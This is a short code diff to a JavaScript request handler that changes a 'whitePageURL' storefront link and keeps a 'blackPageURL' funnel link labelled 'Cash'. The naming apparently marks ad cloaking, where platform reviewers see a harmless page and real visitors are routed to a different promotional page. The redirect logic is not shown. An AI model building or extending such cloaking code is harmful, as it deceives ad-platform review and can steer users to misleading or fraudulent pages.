@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://dawnmvd.pixels.com/featured/summer-lemons-dawn-van-doorn.html?product=adult-tshirt";
+    const whitePageURL = "https://xavemenmyshopifycom.creator-spring.com/listing/xaveman-clothing?product=636";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123-second";
   
